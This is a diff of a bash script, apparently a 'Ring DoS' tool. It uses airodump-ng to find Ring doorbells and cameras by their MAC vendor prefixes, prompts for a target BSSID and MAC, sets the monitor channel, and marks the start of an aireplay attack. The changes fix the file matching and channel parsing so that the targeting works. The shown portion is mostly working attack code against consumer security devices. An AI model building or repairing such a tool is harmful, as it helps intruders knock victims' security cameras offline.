@@ -124,7 +124,7 @@ airodump_scan
 
 # Search for ring devices
 # Check if any devices match the filter
-if ! grep -qE '54:E0:19|5C:47:5E|9C:76:13|34:3E:A4|64:9A:63|90:48:6C' /tmp/rdos/airodump*; then
+if ! grep -qE '54:E0:19|5C:47:5E|9C:76:13|34:3E:A4|64:9A:63|90:48:6C' /tmp/rdos/airodump*.csv; then
     while true; do
         clear
         printf '\e[1m\e[31mNo ring devices found!\n\e[0m'
@@ -136,7 +136,7 @@ if ! grep -qE '54:E0:19|5C:47:5E|9C:76:13|34:3E:A4|64:9A:63|90:48:6C' /tmp/rdos/
                 sudo rm -r /tmp/rdos/airodump*
                 # Start airodump-ng
                 airodump_scan
-                if grep -qE '54:E0:19|5C:47:5E|9C:76:13|34:3E:A4|64:9A:63|90:48:6C' /tmp/rdos/airodump*; then
+                if grep -qE '54:E0:19|5C:47:5E|9C:76:13|34:3E:A4|64:9A:63|90:48:6C' /tmp/rdos/airodump*.csv; then
                     break
                 fi
                 ;;
@@ -159,11 +159,11 @@ fi
 # Aireplay attack start
 clear
 printf "Station MAC, First time seen, Last time seen, Power, # packets, BSSID, Probed ESSIDs\n"
-grep --color -E '54:E0:19|5C:47:5E|9C:76:13|34:3E:A4|64:9A:63|90:48:6C' /tmp/rdos/$RESULT
+grep --color -E '54:E0:19|5C:47:5E|9C:76:13|34:3E:A4|64:9A:63|90:48:6C' /tmp/rdos/airodump*.csv
 printf "\n"
 read -p "Enter BSSID of target: " BSSID
 read -p "Enter MAC of target: " MAC
-CHNL=$(awk -F, -v BSSID="$BSSID" '$0 ~ BSSID {split($0, fields, ",");channel = gensub(/[^0-9]+/, "", "g", fields[4]); if (channel <= 13) print channel}' /tmp/rdos/$RESULT)
+CHNL=$(awk -F, -v BSSID="$BSSID" '$0 ~ BSSID {split($0, fields, ",");channel = gensub(/[^0-9]+/, "", "g", fields[4]); if (channel <= 13) print channel}' /tmp/rdos/airodump*.csv)
 printf "Setting the monitor channel to the same channel the target AP is on...\n"
 sudo airmon-ng stop $INF
 sudo airmon-ng start $ITMP $CHNL
